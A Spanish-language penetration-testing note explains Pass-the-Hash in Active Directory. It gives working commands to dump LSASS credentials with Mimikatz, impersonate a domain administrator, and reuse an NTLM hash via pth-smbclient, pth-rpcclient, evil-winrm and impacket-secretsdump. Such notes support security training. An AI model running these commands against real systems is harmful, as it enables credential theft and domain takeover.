# Pass The Hash 

Tags: #AD #PtH 

## Windows 

* [NTLM](https://learn.microsoft.com/es-es/windows/win32/secauthn/microsoft-ntlm)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)

Mimikatz creará una nueva 'logon session' dentro de la máquina donde va a sobrescribir el hash en memoria que este asociado a ella por el que se indicado en el comando del usuario admin. Después, copiará el token de acceso asociado al proceso y lo añadirá a la 'logon session' y finalizará ejecutando un proceso como una CMD.

```bash 
Descargar mimikatz 'mimikatz_trunk.zip' desde el enlace de arriba y pasar '/mimikatz_trunk/x64/mimikatz.exe' a la máquina Windows con el usuario comprometido 
```

```powershell 
# Utilizar un usuario 'administrador' local 

❯ .\mimikatz.exe
	❯ sekurlsa::logonpasswords   # Dumpear todos los usuarios y hashes (NTLM) de todas las sesiones lsass

# Hacer PtH suplantando al usuario 'Administrador' en el dominio utilizando el hash ntlm 
	❯ sekurlsa::pth /user:administrator /domain:domain1 /ntlm:a87f3a337d73085c45f9516be5787d85 
```

## Kali 

Cuando se tiene el **hash NTLM** de un usuario con privilegios administrativos, es posible autenticarse contra recursos administrativos como `C$` vía SMB sin conocer la contraseña en texto plano. Esta técnica se conoce como **Pass-the-Hash (PtH)** y consiste en reutilizar directamente el hash durante la autenticación NTLM para obtener una sesión válida en el servicio SMB del equipo remoto, siempre que el usuario tenga permisos suficientes en el host destino.

```bash 
# Para consumir un servicio de archivos como 'C$' de cualquier máquina se puede utilizar el hash ntlm del usuario 'admin' y obtener un prompt del servicio 'smb'
❯ pth-smbclient //IP/c$ -U Administrator --pw-nt-hash a87f3a337d73085c45f9516be5787d85 -W domain
```

```bash 
# Para consumir un servicio de RPC se puede utilizar el hash ntlm del usuario 'admin' y obtener un prompt del servicio 'RPC'
❯ pth-rpcclient -U domain/Administrator%00000000000000000000000000000000:a87f3a337d73085c45f9516be5787d85 //IP
```

```bash 
# Obtener un CMD si esta activado el servicio de WinRM
❯ evil-winrm -i IP -u Administrator -H a87f3a337d73085c45f9516be5787d85
```

```bash 
# Solo se necesitan las credenciales validas del usuario con permisos de 'administrador' para hacer un DCSync o dumpear la SAM vía remoto

❯ impacket-secretsdump Administrator@IP -hashes :a87f3a337d73085c45f9516be5787d85 
	# Administrator = Es una cuenta de admin del dominio
	# hashes = Es el hash NTLM de la cuenta admin del dominio  
```